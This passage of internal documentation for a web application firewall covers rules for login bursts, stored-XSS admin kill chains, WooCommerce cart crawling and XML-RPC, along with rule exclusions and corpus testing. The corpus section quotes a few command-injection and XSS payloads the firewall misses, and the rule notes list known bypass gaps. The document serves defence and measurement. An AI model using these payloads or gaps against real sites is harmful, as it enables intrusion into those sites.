by the same keys, `\u00XX` decoded; Drupal's REST login
(`/user/login?_format=…`) counts whatever the body. Login-page GETs and admin
navigation never count; XML-RPC is 510-512's.

**Padded bodies.** A POST to a **login-only** endpoint (`wp-login.php`,
`/user/login`, `…/login`, `/admin/login`, Magento's admin login paths,
OpenCart `route=common/login`) whose body the edge cut at
`waf_body_max_len` (32 KB) or did not read counts by its path: no login form
is that big, and padding would push the password past the cut. The Joomla /
OpenCart admin index serves every admin action, so a big body there does not
count.

**Direct clients** are capped at `auth_burst_direct_mode` (default
`challenge_v2`; never stronger than `rule_auth_burst`; an unknown value reads
as `logonly`); a proxied client gets the rule's mode. Burn-in (86 h, six
nodes): ~1 850 direct hits, all but 9 single hits from hosting / VPN / Tor
ASNs, no Greek ISP, no relay (QUIC.cloud, Sucuri, an office NAT), no admin
retrying a login. Step back with `auth_burst_direct_mode = "logonly"`. An
untrusted relay reads as one direct client across every vhost: look for one
in `waf_rule_detail 501` before blaming the rule.

**Cleared clients.** `post_clearance_action` makes a challenge-tier hit
`logonly` for a cleared client, so one solve would allow unlimited logins.
cfm.lua refuses a cleared client's submissions past the threshold (403,
`X-CFM-Action: login_capped_pc`, a `login_capped_pc` edge error-log line) until
the window closes, and pushes the hit as `logonly`, so it never earns a ban.
501 counts wherever it sits in the hit list (keying on the headline let one
junk `<script` arg, 302, switch the cap off). A resumed POST passes once per
IP per window. Evidence: in three weeks 501 fired ~15 800 times, all
`challenge_v2` but 7 converted hits from real users (Greek ISPs, a `cpanel.`
login, an office tool); a ban would have hit them, a 20 s refusal does not. A
cleared client at the cap still gets ~21 tries a minute; banning that needs a
failed-login count that sees the origin's answer (planned, `docs/ROADMAP.md`).

**Panel ports** read no body (`body_unread`), so 501 never runs there;
cPanel's `login_log` detector (`internal/detectors/cpanel`) bans repeated
failures.

**Not counted** (the path test reads `ngx.var.uri`): Drupal 7
`/index.php?q=user/login`; Joomla `POST /administrator/` and its frontend
login (`option=com_users&task=user.login`); WooCommerce `/my-account/`;
Adminer; a password in a POST's query string; a Joomla admin login, an
OpenCart 3 login on any route but `common/login`, or a Magento admin login on
its bare route, padded past the cut; field names outside the list
(`session[password]`, Symfony `_password`, an array-wrapped or BOM-prefixed
JSON body). An OpenCart admin customer save sends an empty `password=` and
counts; eight in 20 s is not a workflow.

## Rule 503 — `rule_wp_admin_cross_screen` (a stored XSS driving an admin's browser)

Family **`WAF_ADMIN_XSCREEN`**, `logonly`. A stored XSS runs in an
administrator's browser with their cookie and nonces, so every request it
sends is a legitimate admin request. On tophair.gr (2026-10-06, PixelYourSite
CVE-2026-1844) staff opened an order, and within five seconds their browser
fetched nonces, created an administrator and uploaded a backdoor plugin, all
with the **order screen** as Referer. No content rule could see it.

**Signal: where the request came from.** WordPress submits these forms only
from their own screen, as a navigation a click started. Only with a
`wordpress_logged_in_` cookie.

| tag | signal |
|---|---|
| `<EP>:SCRIPT` / `<EP>:FRAME` | `Sec-Fetch-Dest` other than `document` (framed = FRAME). A script can set or drop the Referer, not Fetch Metadata. |
| `<EP>:FROM:<screen>` | a same-host Referer from another admin screen or the front end (`front`). |
| `<EP>:CROSS_SITE` | `Sec-Fetch-Site: cross-site`. |
| `<EP>:NO_ACTIVATION` | a document navigation without `Sec-Fetch-User`: a `form.submit()` no click started. |
| `<EP>:NO_REFERER` | an XHR leg (admin-ajax, REST) with no Referer or a bare origin; an admin page sends the full URL. |
| `NONCE_SCRAPE:<screen>` / `NONCE_FRAME:<screen>` | a GET of a nonce-bearing screen by script or markup (not `Sec-Purpose: prefetch`), or framed (not plugin-install's own thickbox). |

**Legs (`<EP>`):** `USER_NEW`, `USER_EDIT`, `PROFILE`, `SITE_USERS`, `USERS`,
`USERS_ROLE` (the role change WordPress sends as a GET), `OPTIONS_GENERAL`
(`options.php` with `option_page=general` only: plugin settings pages post to
`options.php` from `admin.php?page=…`), `UPLOAD_PLUGIN` / `UPLOAD_THEME` and
`INSTALL_PLUGIN` / `INSTALL_THEME` (`update.php`; a POST whose action lies past
the body window is `UPLOAD`), `ACTIVATE` (Fetch Metadata only: themes and
plugins put "Activate" links on their own pages), `FILE_EDITOR` and
`AJAX_PLUGIN` (Referer and `NO_REFERER` only), and `REST_USERS`,
`REST_APP_PASSWORD`, `REST_PLUGINS` (cookie-authenticated REST writes, routed
as WordPress routes them, `rest_route` in any spelling PHP registers). Which
screen each is allowed from is in `cfm_waf_detectors.lua` (`XSC`); notable:
`/users/me` counts only a write naming `email`, `password`, `roles` or
`username` as a KEY (the block editor and wc-admin save preferences there),
and `REST_PLUGINS:FROM:post.php` (the block directory) needs a look in the
burn-in. Fields are read as PHP registers them, any value rather than PHP's
last (a trailing duplicate past `max_input_vars` is a decoy). The screen is
what follows the first `/wp-admin/`, cut at its `.php`. No Referer is no
signal (a `no-referrer` policy); a cross-host Referer without
`Sec-Fetch-Site` is left to the nonce.

**Order.** Runs last but 612 and 530, after every armed block rule, so a held
block promotion cannot take the headline and end evaluation before an armed
rule's ban. **Push window:** the leg stays in the push key
(`PUSH_KEY_KEEPS_TAG`); a family-keyed window logged only the first leg of a
kill chain (the nonce scrape).

**Not covered.** Enumerating WordPress's privileged endpoints is never
complete (four review rounds each found more; plugins add their own). 503
detects the kill chain as run today; it is not a seal:
- an action no leg lists;
- a body padded past the body window;
- a spoofed Referer on an XHR leg, where Fetch Metadata cannot help;
- a browser without Fetch Metadata (Safari < 16.4).

The backstop is watching the outcome (a new administrator, a new plugin, a PHP
file written by the web user; gap analysis D1/D2).

**FP baseline** (titan, 545 access logs, 2026-09/10): `user-new.php` 53 POSTs
from its screen + 1 other; `upload-plugin` 332 from `plugin-install.php` + 1
without Referer + 1 other; `users.php` 108 and `upload-theme` 13, all from
their screen. Both "other" were the tophair attack. Access logs hold no Fetch
Metadata, so SCRIPT / NO_ACTIVATION have no baseline yet.

**Promotion.** The client IP is the victim's browser: a block promotion must
set `HoldAutoblock` on 503 (edge 403, no nft ban). A hit means the site stores
a payload in something an admin just opened (an order, comment, review, form
entry): find and clean it, as was done for PixelYourSite's `pys_enrich_data`.

## Rule 530 — `rule_wc_cart_get_crawl` (WooCommerce add-to-cart crawling)

Family **`WAF_CART_CRAWL`**, `logonly`, a cost signal. WooCommerce adds to the
cart for any `add-to-cart=<id>` request, and listings print that link on every
product. Each crawled request starts a session and writes a cart, uncached,
at 1-3 s of PHP. One day on six nodes (2026-11-17): ~265 000 such GETs, mostly
self-declared crawlers (meta-externalagent, meta-webindexer,
SERankingBacklinksBot, ClaudeBot, Claude-SearchBot); the rest from rotating
residential addresses with a browser UA, one or two each (Imunify360's "GET
add-to-cart flood pattern": 7 082 addresses in two days on earth), which
per-IP counting never sees. ~37 h of backend time a day on mars.

**Matches** a `GET` / `HEAD` with `add-to-cart` in the query (name read as PHP
reads it, case-sensitive) and a value holding a digit. Tags: `CRAWLER` (a
self-declared bot UA); `NO_REFERER` (not a self-declared bot, no Referer, no
same-site Fetch Metadata); `XSITE` (a browser UA with another site's Referer,
possibly a person).

**Stands down** for a shopper's click (a same-site Referer, or `Sec-Fetch-Site`
same-origin / same-site) and for a WooCommerce session or WordPress login
cookie, whatever the UA: an in-app browser can carry a crawler token, and a
person's click must never be tagged a crawler's. Same-site = the host or a
name under it, ignoring a leading `www.`, never its parent or a sibling under
a public suffix. The product page's own form POSTs `add-to-cart` in the body
and is out of scope.

**Not covered.** Every input is client-authored: a crawler forging a same-site
Referer or the cookie name is not counted. Acceptable for a cost signal, and
why no tag may key enforcement by itself. Bypass-list crawlers skip the WAF at
Step 0 and are not measured.

**Order.** Runs after every other rule, 612 included (its residential clients
are 612's population; ahead of it 530 took their headline and push). Count
530 from the headline and from `also_rule_ids`. **Push window:** the tag stays
in the push key and the window is an hour (`PUSH_COOLDOWN_FAMILY`, logonly
tier only): at ~1 request per IP per minute a 60 s window pushed ~80 k history
rows a day on mars. The burn-in counts clients per hour, not requests.

**The `CRAWLER` redirect (since 2026-11-24).** After the burn-in (~416 000
hits in 96 h on seven nodes, meta-externalagent the top source on every one),
a request tagged `CRAWLER` gets a **301 to the same URL without
`add-to-cart`** (`cfm.lua`, right after the WAF): the shop writes no session
and cart, and the page stays reachable. On 2026-11-24 meta-externalagent
alone made ~27 000 such writes on titan in three hours. The hit is still
logged and pushed as logonly (`X-CFM-Action: cart_crawl_redirect`, `up=cfm_redirect`
in the access log). The redirect:
- only follows a logonly verdict: a stronger hit keeps its own answer;
- never applies behind a trusted proxy (Cloudflare): a CDN cache rule that
  ignores `Cache-Control` could serve it to shoppers on the same URL (the
  anastasiadi.gr incident, CLAUDE.md §6). It carries `Cache-Control:
  no-store` and `Vary: User-Agent` for any other cache. **Residual:** a CDN
  the edge does not trust (Bunny, Fastly, a customer's Varnish) looks like a
  direct client, so a "cache everything, ignore origin headers" rule there
  could still cache the 301. That is WebShield parity P4's question ("never
  treat a CDN node as a client", `docs/imunify360-gap-analysis.md`);
  `wc_cart_crawl_redirect = false` is the switch if it happens;
- answers before Step 3: a crawler the daemon blocks or challenges gets the
  301 first, and the block or challenge on the URL it is sent to;
- strips every field PHP registers as `add-to-cart` (an array form, an
  encoded name) through the same reader that found it, keeps the other
  fields as sent, and sends a path with leading slashes collapsed (`//x/`
  would be another site's URL).

`NO_REFERER` and `XSITE` stay logonly: real shoppers from ad campaigns may be
among them. `wc_cart_crawl_redirect = false` in `cfm_waf_config.lua` turns
the redirect off (next edge reload). No family block rule is planned, so
`waf_security` never arms the family.

**meta-externalagent's node cap (since 2026-11-24).** The per-vhost Meta
budgets (10 pages/s, 30 connections per vhost) never bound it: it spreads over
every shop on a node, ~0.4 pages/s each. On 2026-11-24 it sent titan ~530
pages a minute for three hours at ~1.5 s of PHP each (~13 PHP workers, 16% of
the origin's time), and titan and orion hit 100% CPU. The edge confs give it
one budget for the whole node: **2 pages/s, burst 10, 6 connections**, then
429 (in `throttle.log`). Pages only: its images / css / js keep the image
budget. facebookexternalhit, meta-externalads and the in-app browsers (FB_IAB,
the `fbsv.net` forward proxies) never take this key. The rates are in the
confs (`meta_ext_node_rps`, `meta_ext_node_conn`), so a change is a conf
change.

**meta-webindexer takes the same node cap, under its own key (since
2026-11-24).** Meta AI's search indexer was in no Meta budget at all, per
vhost or per node. A read of 7 nodes on 2026-11-23/24 put the origin cost
of each Meta crawler at:

| Crawler | Average concurrent origin requests | Budget |
|---|---|---|
| meta-externalagent | ~21 across the fleet (5.3 on titan, 5.6 on orion) | node cap |
| meta-webindexer | ~8 (2.1 on titan, 1.8 on orion), mostly at night | node cap (new) |
| facebookexternalhit (link previews) | ~3.5 | per vhost |
| meta-externalads (ads) | ~0.45 | per vhost |
| facebookcatalog | ~0 | per vhost |

On titan the Meta crawlers together kept ~8 origin requests busy, against
12–25 for the whole node at a normal hour. meta-webindexer now counts as a
Meta crawler on the per-vhost budgets (`$is_meta_crawler` 2), and on the node
gets 2 pages/s, burst 10, 6 connections of its own: the two crawlers' keys
share the zones, never a budget. Link previews, ads and the catalog keep
their per-vhost budgets only: they are the paid side, and cost little. The
in-app browsers (real users) take no crawler budget at all.

Two things to know:
- **Visibility in Meta AI search.** The indexer's night runs will now meet
  429s, and Meta may crawl less or drop pages that keep answering 429. After
  a deploy, count meta-webindexer's 429s in `throttle.log` (it logs only
  429s) against its requests in the access log, across the fleet for a few
  days. If the share is high, raise its rate.
- **A spoofed UA can starve the real crawler.** Each crawler has one key per
  node, so anyone sending that UA at 2 pages/s or more from any address keeps
  the real crawler at 429 on that node. This was already true of
  meta-externalagent. It is acceptable for a soft throttle; if it matters,
  the fix is a key gated on Meta's ASN (AS32934), not a map change.

## XML-RPC rules (510-512) and the Jetpack carve-out

Family `WAF_AUTH_BURST`, all `block`: 510 `system.multicall`, 511
`pingback.ping`, 512 a POST rate (6 a minute per client across the server's
vhosts; an IPv6 client is its /64, `docs/edge-ipv6.md`).

**510 / 511 read method names as WordPress's IXR_Message does**
(`det.xmlrpc_method_names`, one linear pass over IXR's parser events, after
dropping one `<?xml…?>` from the first 100 bytes). Every name is checked (IXR
calls the last), so entities, CDATA, comments and padding read as WordPress
reads them. The body-wide match on the first 2 KB stays (a multicall's calls
are strings in its params).

**Padding.** The edge reads 32 KB (`waf_body_max_len`). A call cut there whose
last visible method name is none, or not one of the big-body calls
(`wp.uploadFile`, `metaWeblog.newMediaObject`, new / edit post, page or
comment), was padded: 510 reports it at `logonly`
(`AUTH_WP_XMLRPC_HIDDEN_METHOD`, burn-in before it blocks; clients write the
name in the first hundred bytes or so). Those logonly 510 hits never feed
autoblock; 512 still counts the POSTs. **Not covered:** a decoy that *is* a
big call (`wp.uploadFile` up front, `system.multicall` past the cut) reads as
the big call, and only 512 applies; closing it needs the body past the cut,
which the edge does not keep.

**511 blocks but does not ban** (`HoldAutoblock`, `RULE_511 = 0`): WordPress
sends `pingback.ping` itself (UA `The Incutio XML-RPC PHP Library --
WordPress/x`) when a post links to our sites, and the ban hit the sender's
shared hosting server, every port. A UA carve-out was rejected (a one-line
spoof; `ALLOW_UA_CONTAINS` exempts every family). The block is recorded after
every armed block rule (`st.xmlrpc_pingback`), so a pingback carrying an armed
payload (329) is banned by that rule. A real pingback (last `methodName` is
`pingback.ping`, body seen whole) that 511 stops never counts toward 512 and
leaves a 10 s IP decision (`block_ttl_sec`), not 30 min; anything else still
counts. Decision record: `docs/waf-autoblock-design.md`.

**Jetpack.** 510-512 and 501 skip Jetpack's own traffic
(`is_known_legit_xmlrpc`): a Jetpack marker (`?for=jetpack`, a Jetpack /
WordPress.com UA, the word in the body) **from a Jetpack network**, the ranges
in `https://jetpack.com/ips-v4.txt` (eight IPv4 ranges, read 2026-10-09). A
marker alone is not enough (any client can add one). If Jetpack changes its
ranges, set them in `cfm_waf_config.lua`:

```lua
xmlrpc_jetpack_nets = { "192.0.64.0/18", "195.234.108.0/22", "..." },
```

This is the one place the ranges are hard-coded: the traffic-rules xmlrpc
lockdown preset (`rules-model.js`) takes them as operator input on purpose,
since an allow rule there opens the whole path.

**Counters.** The burst counters (501, 502's repeated HEAD, 512) are one
atomic `cfm_shdict.incr` per window. A window under 1 s counts as 1 s, and the
first hit only opens the window (a threshold of 1 still needs a second hit).

## Per-vhost rule exclusions

Operators can suppress specific WAF rules on specific hosts/paths without disabling the whole WAF for that scope. This solves the canonical "scraper triggers `WAF_PROXY_HDR` on one site" pattern (2026-05: a distributed scraper from AS200373 / 3xK Tech sent malformed `X-Forwarded-For` values to one shop, vitolighting.com, and made a third of the fleet's WAF events) — keep the rest of the ruleset hot, drop just the noisy rule on the affected host.

### Data model

`internal/webdetector/exclude_store.go`'s `excludeEntry` carries an optional `RuleIDs []int`:

| Entry shape | Meaning |
|---|---|
| `RuleIDs == nil` | **Whole-WAF skip.** All WAF rules suppressed for this host/path. The legacy "WAF off for this vhost" case. |
| `RuleIDs == []int{}` (zero length but non-nil) | Stored as `nil` by `normalizeRuleIDs`; never round-trips as empty. |
| `RuleIDs == [101, 320, …]` | **Rule-scoped skip.** Only the listed `waf_rule_id`s are suppressed; everything else still fires. |

Whole-WAF wins on collision. Two rule-scoped entries on the same host/path get merged via `MatchWAFRules` (sorted, deduplicated union).

### CLI

```
cfm webtop waf exclude list
cfm webtop waf exclude add    <value> [--type host|path] [--rule N|Nxx|N-M ...] [--scope host ...]
cfm webtop waf exclude remove <value> [--type host|path] [--rule N|Nxx|N-M ...] [--scope host ...]
```

`<value>` is matched at a domain/path **boundary** (not a raw substring), or
as a glob when it contains any of `* ? [ ]`. For `--type host` a literal is the
exact host or a dot-boundary subdomain suffix (`shop.gr` matches `shop.gr` and
`www.shop.gr`, never `myshop.gr` / `shop.gr.evil.com`); for `--type path` it is
the exact path or a path-segment prefix (`/admin` matches `/admin` and
`/admin/x`, never `/administrator`). `--type host` matches against the request
host; `--type path` matches against the request path. `--type` defaults to
`host`.
Each entry is single-axis on its `--type` — host **or** path — but `--scope`
adds an independent host filter on top, so you can pin a path exclusion to one
vhost without a unique path string (or a glob like `*/plexusnet/*`).

Omitting `--rule` creates a **whole-WAF** entry (legacy "WAF off for this
scope"). Pass `--rule` one or more times to create a **rule-scoped** entry
that suppresses only the listed `waf_rule_id`s.

`--scope <host>` (repeatable / comma-separated) restricts the entry to
specific vhosts — the third axis that lets you express the exact intersection
"rule N, on path P, for vhost H" (e.g. suppress rule 402 on
`/wp-admin/admin-ajax.php` for one migrating site only). Omitting it leaves the
entry admin-global (all vhosts), as before. **Admin-only in effect:** a scoped
(cPanel) token is always pinned to its own vhost set server-side, so a
`--scope`/`scope_hosts` value from a scoped caller is ignored — it can never
widen or redirect an exclude to another tenant's vhost. Because the qualifier
can only *add* a host filter, it never broadens an exclude.

Rule-ID spec accepts:

- Bare ID: `--rule 320`
- Wildcard: `--rule 3xx` → expanded to 300-399 at parse time
- Range: `--rule 310-317`
- List: `--rule 320,3xx,605` (deduped)
- Repeat: `--rule 201 --rule 605` (merged)

### Worked example — desktop-client false positive

A Greek clinical-software vendor's desktop activator phones home from many
residential IPs without sending `User-Agent`, `Accept`, or `Referer`. It
trips `rule_bad_ua` (`waf_rule_id=201`, reason `WAF_BAD_UA:UA_EMPTY+NO_ACCEPT+NO_REFERER:score=4`)
on every check-in. The traffic is legit; the rule is doing exactly what it
should for everyone *else*.

Right answer — narrow path-scoped exclusion of just rule 201:

```
cfm webtop waf exclude add /plexusnet/updates_v4/plexus4activator.php --type path --rule 201
```

Now `rule_bad_ua` keeps firing on every other URL on every other vhost, the
activator URL stops being challenged, and the rest of the WAF still inspects
the request (SQLi, RCE, upload rules, etc. all still apply). Confirm with:

```
cfm webtop waf exclude list
```

Wrong answers, for reference:
- `cfm webtop waf exclude add www.iqdevelopment.gr --type host` — disables the **entire WAF** for that vhost. Way too broad.
- `rule_bad_ua = "disabled"` in `cfm_waf_config.lua` — turns rule 201 off for every vhost. Worse.
- Editing the Lua detector — rule 201's bot signal is correct in general; the fix is operator-side configuration.

### API

```
GET  /api/v1/waf/exclude/list
POST /api/v1/waf/exclude/add?type=host&value=example.com[&rule_ids=320,3xx,310-317][&scope_hosts=a.com,b.com]
POST /api/v1/waf/exclude/remove?type=path&value=/plexusnet/&rule_ids=201[&scope_hosts=a.com]
```

`rule_ids` is a CSV string in the same spec format as `--rule`. Empty / missing → whole-WAF entry.

`scope_hosts` is a CSV of vhosts to scope the entry to (the API form of
`--scope`). It is honoured only for an admin token; for a scoped token the
effective scope is always the token's own vhost set, so a `scope_hosts` value
from a scoped caller is ignored (it can never widen or redirect the entry).
Empty / missing → admin-global (all vhosts). To remove a scope-qualified
entry, echo the same `scope_hosts` (the list response returns each entry's
`scope_hosts`, so the UI/CLI can round-trip it) — the entry is keyed by its
`(type, value, scope_hosts, rule_ids)` tuple.

`GET /api/v1/waf/exclude/list` returns each entry's `rule_ids` (sorted, deduped) and `scope_hosts` (sorted, deduped) when set; either field is omitted otherwise.

### Lua wiring

cfm.lua's `waf_skip_for(host, path)` returns one of:

```
nil                      -- no exclusion
{whole = true}           -- skip whole WAF
{rule_ids = {[101]=true, [320]=true, …}}  -- skip these specific rules
```

The Lua-side WAF (`cfm_waf.lua` `_M.check`) reads `ctx.skip_rule_ids` (a set keyed by integer rule_id) and passes it to `record()`. Each rule fire that has a `skip_rule_ids` match returns the same shape as a no-hit (`severity = 0`), so it never leaks into severity, hits[], or the engine's strongest-action selection.

cfm.lua's vhost-controls panel still shows the "WAF on/off for this host" toggle, but only counts whole-WAF entries — rule-scoped entries are filtered out so they don't change the toggle state.

### Tests

`scripts/tests/cfm_waf_severity_test.lua` covers `ctx.skip_rule_ids` end-to-end. `internal/webdetector/exclude_store_test.go` covers the matching layer. `internal/webdetector/exclude_rule_ids_test.go` covers the rule-ID-spec parser.

---

## Labelled corpus (BlazeHTTP)

Hit-rates (next section) say how often a rule fires on real traffic; they
cannot say what the WAF **misses**, and a "noisy" rule may be catching real
attacks. A labelled corpus answers both, before a change ships:

```bash
make waf-corpus                                   # fetch + run, print the report
make waf-corpus ARGS="--out /tmp/before.tsv"      # keep per-sample results
# … change a rule …
make waf-corpus ARGS="--out /tmp/after.tsv --baseline /tmp/before.tsv"
```

`scripts/waf_corpus/blazehttp.sh` fetches [BlazeHTTP](https://github.com/chaitin/blazehttp)
at a pinned commit into `~/.cache/cfm/` (~33 k benign `.white` and ~650 attack
`.black` raw-HTTP samples) and runs `scripts/waf_corpus/run.lua` on it. It is
GPL-3.0: run it, never vendor its samples or code into this repo. Bumping the
pinned commit changes the corpus, so `--out` files from before are no longer
comparable.

**What it measures.** The engine, `cfm_waf.check()`, under LuaJIT with the
shipped rule modes (plus `configs/lua/cfm_waf_config.lua`), given what the edge
would hand it: `ngx.var.uri` emulated (percent-decoded, slashes merged, dot
segments resolved; a bad `%`-escape, an escaped NUL or a path above the root is
nginx's 400 and reported as such), lowercased header names with repeats as a
list, header names nginx drops by default (`_` and other invalid characters)
dropped, Content-Length as BlazeHTTP sends it (the body's length, or no header
without a body), every POST/PUT/PATCH body given to the WAF up to
`waf_body_max_len`. Each sample is a different client with a fresh shared dict,
so the per-IP counting rules (501, 512) cannot fire. The `Host` header, and the
host the WAF is told about, are `waf-corpus.example` (`--keep-host` uses the
sample's): the corpus's attacks name an IP literal and its benign samples a
hostname, so rule 602 would otherwise "detect" the layout (32.0% → 85.7%). A
request with an absolute-form target (`GET http://host/…`) takes its host
from the target, as nginx does. A file that is not an HTTP/1.x request is
`parse_error`; leading empty lines are skipped, as nginx skips them.

**What it does not model** (`cfm.lua` is not run): the bypass lists, per-vhost
exclusions, clearance, traffic rules, IP / vhost decisions, and the body read
gate. On the edge a body reaches the WAF when its Content-Type is inspectable
(none, urlencoded, json, multipart, xml, `text/*`) or the path is on `cfm.lua`'s
dynamic-endpoint list. The report tags each benign enforcing hit that needs the
body: `ct` (read on any path) or `list` (read only on a listed path).

**Outcome** per sample: `block`, `challenge`, `challenge_v2`, `logonly`, `clean`,
`nginx_400`, `parse_error`, `error` (the WAF raised). "Detected" is an
enforcing outcome (block or a challenge tier); the report also gives
block-only and any-incl.-logonly rows. Rates are over the samples the WAF
saw: `nginx_400` and `parse_error` have their own rows and are neither a
detection nor a miss. When a hit is tagged as needing the body, the recheck
ran the request without its body and without its Content-Length. The per-rule table counts every hit of a sample, not
only the headline, so a rule that only fires behind a stronger one shows.

### Baseline — 2026-11-18, BlazeHTTP `afc88a94`

Over the samples the WAF saw: 657 of the 658 attacks (one is nginx's 400)
and all 33 219 benign ones.

| | attack (657) | benign (33 219) |
|---|---|---|
| block | 112 (17.0%) | 2 (0.01%) |
| block + challenge tiers | 210 (32.0%) | 199 (0.60%) |
| any, incl. logonly | 214 (32.6%) | 204 (0.61%) |

- **False positives** are almost all rule 601 (`rule_ctrl_chars`,
  challenge_v2): 178 of 199, all analytics / telemetry POST bodies carrying
  binary or compressed bytes, which the edge reads: 113 declared `text/plain`,
  36 sent no Content-Type, 28 `application/x-www-form-urlencoded`, 1
  `application/json`. A fix keyed on "no Content-Type" would clear only the
  36. None of it shows on the fleet: over the 7 days to 2026-11-18, 601 hit
  56 times on the 8 edge nodes, and only 9 of those were a visitor's request
  (FP case 13; the beacons above are Chinese analytics our tenants do not
  run). So 601's logic was not changed for the corpus: the fleet, not the
  corpus, decides a rule change. Then 302 (`rule_xss`) 17. The two block FPs are arguable
  labels: a `HEAD /?protocol=authentication` from an MSIE 8 UA (201) and a URL
  carrying `%00` (101).
- **Misses** by DVWA module: reflected XSS 59 / 243 detected, SQLi 53 / 118,
  command execution 0 / 14 (`ip=127.0.0.1; cat /etc/passwd`, `ip=1|whoami`:
  shell metacharacters in an arbitrarily named parameter, which 310 does not
  read by design), file inclusion 7 / 10, upload 20 / 20; the non-DVWA samples
  67 / 243. Examples of what passes: `<xss onafterscriptexecute=alert(1)>`, the
  JSON `\u`-escaped and `\x`-escaped JS payloads, base64-wrapped template
  injection.

These are the numbers a rule change is measured against: re-run with
`--baseline` and read the changed samples. After the 2026-11-18 SQLi fixes:
block 114 (17.4%), block + challenge tiers 212 (32.3%), benign unchanged.

---

## Hit-rate measurement

The "Operating the WAF" section above covers the operator workflow. This
section documents the pipeline.

### Pipeline

```
[ cfm.lua ] every WAF check:
   waf_insp_incr(host)            # 2 shdict.incr ops per request (per-host + global)
   maybe_flush_waf_insp()         # 1 shdict.get; only one worker per minute wins
                                  # the SH:add lock and POSTs the snapshot
                  │
                  ▼  POST /nginx/waf/stats {rows:[{hour_unix, host, count}, ...]}
[ Go bridge ] handleWAFStats → SetWAFStatsHook → engine.RecordWAFInspected
                  │
                  ▼  UPSERT waf_inspected(hour_unix, host) ← absolute count
[ SQLite ] waf_inspected table (sparse, ~240 rows/day per host)
```

Each push carries the **absolute** value of the live shdict counter for the current hour. Repeated pushes for the same `(hour, host)` simply overwrite — `INSERT … ON CONFLICT DO UPDATE`. Lock TTL races are safe (idempotent).

### API: `/api/v1/waf/hit-rates`

```
GET /api/v1/waf/hit-rates?hours=24          # global, 24h
GET /api/v1/waf/hit-rates?hours=168&host=X  # per-vhost, 7 days
```

Response (one row per registered rule, even when `hits=0`):

```json
{
  "hours": 24,
  "host": "",
  "inspected_total": 1500000,
  "rules": [
    {"id": 320, "name": "rule_rce", "group": 3, "group_name": "injection",
     "reason_family": "WAF_RCE", "default_mode": "block",
     "hits": 12, "rate_pct": 0.0008, "promotion_hint": "ok_to_promote"},
    {"id": 101, "name": "rule_traversal", "group": 1, "group_name": "path",
     "hits": 75000, "rate_pct": 5.0, "promotion_hint": "noisy"}
  ]
}
```

Per-rule precision uses `json_extract(payload_json, '$.waf_rule_id')` so families with multiple rules (e.g. all `WAF_AUTH_BURST` tags) are counted separately. Events from before the rule-IDs PR have NULL `waf_rule_id` and are excluded from the per-rule view (they still appear in the legacy `WAFByRule` reason-aggregation).

### Hit log format

Every WAF trigger writes one JSON object per line to `cfm.waf.log`,
carrying enrichment (ASN / country) and the per-request forensic fields
(UA, Referer, Content-Type) that drive FP investigation.

```json
{"ip":"1.2.3.4","host":"example.com","uri":"/admin/upload",
 "method":"POST","action":"block","reason":"WAF_UPLOAD_FNAME:PHTML",
 "waf_rule_id":401,"ttl_sec":3600,
 "ua":"curl/7.81.0","referer":"","ct":"multipart/form-data; boundary=...",
 "asn":12345,"asn_name":"EXAMPLE-AS","country":"US"}
```

### Cost / regression notes

| Path | Cost | Notes |
|---|---|---|
| Per WAF check | ~3-5 µs | Two shdict incr + one get-and-compare; under 1% of the check. |
| Per flush (~1/min cluster-wide) | ~3 µs on the lock winner | Snapshot + RPC run in `ngx.timer.at(0, …)`, off the request path. |
| Per WAF trigger | ~50 µs | JSON encode of the forensic fields + one file write. |
| `/api/v1/waf/hit-rates` | <100 ms typical | `json_extract` is O(events in window); operator-pulled, never on the hot path. |

#### Body-aware scan path (php_wrappers / ssrf_proto / js_proto)

Measured through `_M.check` with the three body-aware rules on. "Plain JSON"
has no `%xx` (the common case); "%-encoded" forces the `url_decode_once` slow
path.

| Body | Content-Type | Effective cap | Per-request CPU |
|---|---|---|---|
| 2 KB plain JSON | application/json | 2 KB | ~10 µs |
| 30 KB plain JSON | text/plain | 2 KB (`other` budget) | ~11 µs |
| 30 KB plain JSON | application/json | 30 KB (`json` budget 32K) | ~71 µs |
| 500 KB plain JSON | application/json | 32 KB (`json` budget) | ~87 µs |
| 30 KB %-encoded | application/json | 30 KB | ~0.6 ms (two table-driven gsub passes) |

The end-to-end ceiling is `CFM_WAF_BODY_MAX_LEN` (default 32768,
`cfm_cfg.lua`). `normalize()` skips the gsub passes when the input has no `%`,
which JSON / multipart bodies almost never carry.

Wire fields are `omitempty` and the table is `CREATE TABLE IF NOT EXISTS`, so
upgrades need no migration. Kill switch: `CFM_WAF_STATS_ENABLE=0` disables the
hit-rate counters and flushing.

---

## Request flow

```
[ nginx: location-level dispatch ]
  ├─ /__cfm_challenge, /__cfm_verify, /cpanelwebcall, /cfm-admin/  → bypass cfm.lua
  ├─ \.(css|js|woff2?|ttf|eot|png|jpe?g|gif|webp|ico|map)$         → bypass cfm.lua, proxy to origin
  └─ everything else                                               ↓
[ access_by_lua: cfm.lua ]
  ├─ Step 0a1 /.well-known/ plain GET/HEAD (no query, no script ext) → origin (no WAF, no challenge)
  ├─ Step 0b/0c UA emergency, fingerprint deny
  ├─ POST resume
  ├─ Step 0d  cpanel./whm./webmail. + proxy subdomains reach cpsrvd + /cpsess<N>/ API path
  │            (cfm_panel_hosts.is_session_api, a subset of the panel ports' list)
  │                                    → origin (no WAF, no challenge)
  ├─ Step 1   validate cfm_clearance → clearance_allow (no return yet)
  ├─ Step 2   run WAF (always, regardless of clearance)
  │            ├─ block            → exit 403
  │            ├─ challenge + clearance → convert via post_clearance_action
  │            │                       (high-risk → block; else → logonly)
  │            ├─ challenge no clearance → challenge flow
  │            ├─ logonly          → log + push, then on to Step 2b like a clean request
  │            └─ waf.check raised → fail_open: log, on to Step 2b without the WAF;
  │                                  fail_closed: request_failure (500)
  ├─ Step 2b  honour clearance_allow → refresh cookie, allow origin (return)
  ├─ Step 2.5 forced_challenge for marked locations
  ├─ Step 3   bridge decision (Go side: ip/vhost/rule, fingerprint floor)
  └─ Step 4   allow (micro cache: never for a logonly hit or a WAF error)
```

Key invariants:

